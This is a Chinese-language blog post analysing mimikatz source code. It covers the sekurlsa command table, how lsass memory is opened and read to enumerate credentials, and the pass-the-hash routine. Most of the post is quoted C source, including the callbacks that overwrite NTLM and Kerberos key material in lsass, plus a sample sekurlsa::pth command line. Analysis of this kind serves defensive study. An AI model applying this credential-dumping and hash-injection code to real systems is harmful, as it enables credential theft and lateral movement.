---
title: mimikatz源码分析
date: 2020-12-28 09:58:57
tags:
---

# sekurlsa

sekurlsa模块的主要命令和功能在kuhl_m_c_sekurlsa中定义

<!-- more -->

```c
const KUHL_M_C kuhl_m_c_sekurlsa[] = {
	{kuhl_m_sekurlsa_msv,				L"msv",				L"Lists LM & NTLM credentials"},
	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"Lists WDigest credentials"},
	{kuhl_m_sekurlsa_kerberos,			L"kerberos",		L"Lists Kerberos credentials"},
	{kuhl_m_sekurlsa_tspkg,				L"tspkg",			L"Lists TsPkg credentials"},
#if !defined(_M_ARM64)
	{kuhl_m_sekurlsa_livessp,			L"livessp",			L"Lists LiveSSP credentials"},
#endif
	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L"Lists CloudAp credentials"},
	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},

	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
	{kuhl_m_sekurlsa_sk_bootKey,		L"bootkey",			L"Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials"},
	{kuhl_m_sekurlsa_pth,				L"pth",				L"Pass-the-hash"},
#if !defined(_M_ARM64)
	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L"krbtgt!"},
#endif
	{kuhl_m_sekurlsa_dpapi_system,		L"dpapisystem",		L"DPAPI_SYSTEM secret"},
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
	{kuhl_m_sekurlsa_trust,				L"trust",			L"Antisocial"},
	{kuhl_m_sekurlsa_bkeys,				L"backupkeys",		L"Preferred Backup Master keys"},
#endif
	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",			L"List Kerberos tickets"},
	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",			L"List Kerberos Encryption Keys"},
	{kuhl_m_sekurlsa_dpapi,				L"dpapi",			L"List Cached MasterKeys"},
	{kuhl_m_sekurlsa_credman,			L"credman",			L"List Credentials Manager"},
};
```



## Lists credentials

获取凭据的主要逻辑都在kuhl_m_sekurlsa_enum中的callback，函数原型如下

```c
NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)
```

callback对应了各个小功能的逻辑，比如sekurlsa::msv的callback就是kuhl_m_sekurlsa_enum_callback_logondata

在kuhl_m_sekurlsa_enum中，首先会调用kuhl_m_sekurlsa_acquireLSA去打开lsass进程并初始化一些信息，先看看kuhl_m_sekurlsa_acquireLSA的内部。

打开lsass的DesiredAccess为

```c
DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
```

之后还会检查lsass中某些模块是否加载

```c
BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	ULONG i;
	for(i = 0; i < ARRAYSIZE(lsassPackages); i++)
	{
		if(_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
		{
			lsassPackages[i]->Module.isPresent = TRUE;
			lsassPackages[i]->Module.Informations = *pModuleInformation;
		}
	}
	return TRUE;
}

typedef struct _KUHL_M_SEKURLSA_PACKAGE {
	const wchar_t * Name;
	PKUHL_M_SEKURLSA_ENUM_LOGONDATA CredsForLUIDFunc;
	BOOL isValid;
	const wchar_t * ModuleName;
	KUHL_M_SEKURLSA_LIB Module;
} KUHL_M_SEKURLSA_PACKAGE, *PKUHL_M_SEKURLSA_PACKAGE;

const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
	&kuhl_m_sekurlsa_msv_package,
	&kuhl_m_sekurlsa_tspkg_package,
	&kuhl_m_sekurlsa_wdigest_package,
#if !defined(_M_ARM64)
	&kuhl_m_sekurlsa_livessp_package,
#endif
	&kuhl_m_sekurlsa_kerberos_package,
	&kuhl_m_sekurlsa_ssp_package,
	&kuhl_m_sekurlsa_dpapi_svc_package,
	&kuhl_m_sekurlsa_credman_package,
	&kuhl_m_sekurlsa_kdcsvc_package,
	&kuhl_m_sekurlsa_cloudap_package,
};

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = {L"msv", kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_tspkg_package = {L"tspkg", kuhl_m_sekurlsa_enum_logon_callback_tspkg, TRUE, L"tspkg.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_wdigest_package = {L"wdigest", kuhl_m_sekurlsa_enum_logon_callback_wdigest, TRUE, L"wdigest.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_livessp_package = {L"livessp", kuhl_m_sekurlsa_enum_logon_callback_livessp, FALSE, L"livessp.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {L"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_ssp_package = {L"ssp", kuhl_m_sekurlsa_enum_logon_callback_ssp, TRUE, L"msv1_0.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_svc_package = {L"dpapi", NULL, FALSE, L"dpapisrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package = {L"credman", kuhl_m_sekurlsa_enum_logon_callback_credman, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kdcsvc_package = {L"kdc", NULL, FALSE, L"kdcsvc.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_cloudap_package = {L"cloudap", kuhl_m_sekurlsa_enum_logon_callback_cloudap, FALSE, L"cloudap.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
```

回到kuhl_m_sekurlsa_enum中，接下来会获取一些sessionData，然后调用callback，进入关键逻辑

```c
sessionData.LogonId		= (PLUID)			((PBYTE) aBuffer.address + helper->offsetToLuid);
sessionData.LogonType	= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToLogonType));
sessionData.Session		= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToSession));
sessionData.UserName	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToUsername);
sessionData.LogonDomain	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToDomain);
sessionData.pCredentials= *(PVOID *)		((PBYTE) aBuffer.address + helper->offsetToCredentials);
sessionData.pSid		= *(PSID *)			((PBYTE) aBuffer.address + helper->offsetToPSid);
sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper->offsetToCredentialManager);
sessionData.LogonTime	= *((PFILETIME)		((PBYTE) aBuffer.address + helper->offsetToLogonTime));
sessionData.LogonServer	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToLogonServer);

kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
kull_m_process_getSid(&sessionData.pSid, cLsass.hLsassMem);

retCallback = callback(&sessionData, pOptionalData);
```

总的来说，无论用哪种方式获取凭据，都需要先获取lsass的内存。



## pth

pth即pass the hash，在mimikatz中使用的例子如下

```
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
```

该功能主要逻辑在kuhl_m_sekurlsa_pth中，该函数原型如下

```c
NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
```

在该函数中，会用CreateProcessWithLogonW创建一个新的进程，调用如下

```c
CreateProcessWithLogonW(user, domain, password, iLogonFlags, NULL, dupCommandLine, iProcessFlags, NULL, NULL, &startupInfo, ptrProcessInfos)
```

在sekurlsa::pth中lpPassword为空，dwLogonFlags为LOGON_NETCREDENTIALS_ONLY，msdn对该参数的描述如下

> **LOGON_NETCREDENTIALS_ONLY**
>
> 0x00000002
>
> Log on, but use the specified credentials on the network only. The new process uses the same token as the caller, but the system creates a new logon session within LSA, and the process uses the specified credentials as the default credentials.
> This value can be used to create a process that uses a different set of credentials locally than it does remotely. This is useful in inter-domain scenarios where there is no trust relationship.
>
> The system does not validate the specified credentials. Therefore, the process can start, but it may not have access to network resources.

然后调用kuhl_m_sekurlsa_pth_luid进行pth的核心操作，在该函数内部，首先进一步获取对lsass的写权限。

```c
status = NtQueryObject(cLsass.hLsassMem->pHandleProcess->hProcess, ObjectBasicInformation, &bi, sizeof(OBJECT_BASIC_INFORMATION), &szNeeded);
if(NT_SUCCESS(status))
{
	if(isRWok = (bi.GrantedAccess & (PROCESS_VM_OPERATION | PROCESS_VM_WRITE)))
		kprintf(L"was already R/W\n");
	else
	{
		if(hTemp = OpenProcess(bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, GetProcessId(cLsass.hLsassMem->pHandleProcess->hProcess)))
		{
			isRWok = TRUE;
			CloseHandle(cLsass.hLsassMem->pHandleProcess->hProcess);
			cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
			kprintf(L"is now R/W\n");
		}
		else PRINT_ERROR_AUTO(L"OpenProcess");

		//if(isRWok = DuplicateHandle(GetCurrentProcess(), cLsass.hLsassMem->pHandleProcess->hProcess, GetCurrentProcess(), &hTemp, bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, 0)) // FAIL :(
		//{
		//	CloseHandle(cLsass.hLsassMem->pHandleProcess->hProcess);
		//	cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
		//	kprintf(L"is now R/W\n");
		//}
		//else PRINT_ERROR_AUTO(L"DuplicateHandle");
	}
}
else PRINT_ERROR(L"NtQueryObject: %08x\n", status);
```

接下来进行凭据替换

```c
BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PKIWI_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
	PMSV1_0_PTH_DATA_CRED pthDataCred = (PMSV1_0_PTH_DATA_CRED) pOptionalData;
	PBYTE msvCredentials;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {pCredentials->Credentials.Buffer, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	const MSV1_0_PRIMARY_HELPER * helper = kuhl_m_sekurlsa_msv_helper(cLsass);

	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
	{
		if(msvCredentials = (PBYTE) pCredentials->Credentials.Buffer)
		{
			(*pthDataCred->pSecData->lsassLocalHelper->pLsaUnprotectMemory)(msvCredentials, pCredentials->Credentials.Length);
			*(PBOOLEAN) (msvCredentials + helper->offsetToisLmOwfPassword) = FALSE;
			*(PBOOLEAN) (msvCredentials + helper->offsetToisShaOwPassword) = FALSE;
			if(helper->offsetToisIso)
				*(PBOOLEAN) (msvCredentials + helper->offsetToisIso) = FALSE;
			if(helper->offsetToisDPAPIProtected)
			{
				*(PBOOLEAN) (msvCredentials + helper->offsetToisDPAPIProtected) = FALSE;
				RtlZeroMemory(msvCredentials + helper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH);
			}
			RtlZeroMemory(msvCredentials + helper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH);
			RtlZeroMemory(msvCredentials + helper->offsetToShaOwPassword, SHA_DIGEST_LENGTH);
			if(pthDataCred->pthData->NtlmHash)
			{
				*(PBOOLEAN) (msvCredentials + helper->offsetToisNtOwfPassword) = TRUE;
				RtlCopyMemory(msvCredentials + helper->offsetToNtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
			}
			else
			{
				*(PBOOLEAN) (msvCredentials + helper->offsetToisNtOwfPassword) = FALSE;
				RtlZeroMemory(msvCredentials + helper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH);
			}
			(*pthDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(msvCredentials, pCredentials->Credentials.Length);

			kprintf(L"data copy @ %p : ", origBufferAddress->address);
			if(pthDataCred->pthData->isReplaceOk = kull_m_memory_copy(origBufferAddress, &aLocalMemory, pCredentials->Credentials.Length))
				kprintf(L"OK !");
			else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
		}
	}
	else kprintf(L".");
	return TRUE;
}

void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
{
	PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;
	DWORD i, nbHash;
	BYTE ntlmHash[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
	BOOL isNtlm = FALSE, isAes128 = FALSE, isAes256 = FALSE;
	UNICODE_STRING nullPasswd = {0, 0, NULL};
	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = {NULL, Localkerbsession.hMemory}, aLocalHashMemory = {NULL, Localkerbsession.hMemory}, aLocalNTLMMemory = {NULL, Localkerbsession.hMemory}, aLocalPasswdMemory = {&nullPasswd, Localkerbsession.hMemory}, aRemotePasswdMemory = {(PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetPasswordErase, RemoteLocalKerbSession.hMemory};
	PKERB_HASHPASSWORD_GENERIC pHash;
	PBYTE baseCheck;
	PCWCHAR resultok;
	SIZE_T offset;

	if(RemoteLocalKerbSession.address =  *(PVOID *) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetKeyList))
	{
		if(aLocalKeyMemory.address = LocalAlloc(LPTR,  kerbHelper[KerbOffsetIndex].structKeyListSize))
		{
			if(kull_m_memory_copy(&aLocalKeyMemory, &RemoteLocalKerbSession, kerbHelper[KerbOffsetIndex].structKeyListSize))
			{
				if(nbHash = ((DWORD *)(aLocalKeyMemory.address))[1])
				{
					if(isNtlm = (pthData->NtlmHash != NULL))
					{
						RtlCopyMemory(ntlmHash, pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
						if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_VISTA)	
							(*pData->lsassLocalHelper->pLsaProtectMemory)(ntlmHash, LM_NTLM_HASH_LENGTH);
					}
					
					if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_7)
					{
						if(isAes128 = (pthData->Aes128Key != NULL))
						{
							RtlCopyMemory(aes128key, pthData->Aes128Key, AES_128_KEY_LENGTH);
							(*pData->lsassLocalHelper->pLsaProtectMemory)(aes128key, AES_128_KEY_LENGTH);
						}
						if(isAes256 = (pthData->Aes256Key != NULL))
						{
							RtlCopyMemory(aes256key, pthData->Aes256Key, AES_256_KEY_LENGTH);
							(*pData->lsassLocalHelper->pLsaProtectMemory)(aes256key, AES_256_KEY_LENGTH);
						}
					}

					RemoteLocalKerbSession.address = baseCheck = (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].structKeyListSize;
					i = nbHash * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
					if(aLocalHashMemory.address = LocalAlloc(LPTR, i))
					{
						if(kull_m_memory_copy(&aLocalHashMemory, &RemoteLocalKerbSession, i))
						{
							kprintf(L"data copy @ %p", RemoteLocalKerbSession.address, nbHash);
							for(i = 0, pthData->isReplaceOk = TRUE; (i < nbHash) && pthData->isReplaceOk; i++)
							{
								offset = i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric;
								pHash = (PKERB_HASHPASSWORD_GENERIC) ((PBYTE) aLocalHashMemory.address + offset);
								kprintf(L"\n   \\_ %s ", kuhl_m_kerberos_ticket_etype(pHash->Type));
								
								RemoteLocalKerbSession.address = pHash->Checksump;
								resultok = L"OK";
								if(isNtlm && ((pHash->Type != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (pHash->Type != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)) && (pHash->Size == LM_NTLM_HASH_LENGTH))
								{
									aLocalNTLMMemory.address = ntlmHash;
									offset = LM_NTLM_HASH_LENGTH;
								}
								else if(isAes128 && (pHash->Type == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (pHash->Size == AES_128_KEY_LENGTH))
								{
									aLocalNTLMMemory.address = aes128key;
									offset = AES_128_KEY_LENGTH;
								}
								else if(isAes256 && (pHash->Type == KERB_ETYPE_AES256_CTS_HMAC_SHA1_96) && (pHash->Size == AES_256_KEY_LENGTH))
								{
									aLocalNTLMMemory.address = aes256key;
									offset = AES_256_KEY_LENGTH;
								}
								else
								{
									aLocalNTLMMemory.address = pHash;
									RemoteLocalKerbSession.address = baseCheck + offset;
									offset = FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC, Checksump);
									resultok = kuhl_m_kerberos_ticket_etype(KERB_ETYPE_NULL);
									
									pHash->Type = KERB_ETYPE_NULL;
									pHash->Size = 0;
									kprintf(L"-> ");
								}

								if(pthData->isReplaceOk = kull_m_memory_copy(&RemoteLocalKerbSession, &aLocalNTLMMemory, offset))
									kprintf(L"%s", resultok);
								else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
							}

							if(pthData->isReplaceOk)
							{
								kprintf(L"\n   \\_ *Password replace @ %p (%u) -> ", aRemotePasswdMemory.address, (DWORD) kerbHelper[KerbOffsetIndex].passwordEraseSize);
								if(aLocalPasswdMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].passwordEraseSize))
								{
									if(pthData->isReplaceOk = kull_m_memory_copy(&aRemotePasswdMemory, &aLocalPasswdMemory, kerbHelper[KerbOffsetIndex].passwordEraseSize))
										kprintf(L"null");
									else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
									LocalFree(aLocalPasswdMemory.address);
								}
							}
						}
						LocalFree(aLocalHashMemory.address);
					}
				}
			}
			LocalFree(aLocalKeyMemory.address);
		}
	}
}
```

其中的LsaProtectMemory和LsaUnprotectMemory的实际调用分别是BCryptEncrypt和BCryptDecrypt

总的来说，pth需要对lsass进行写操作来替换凭据。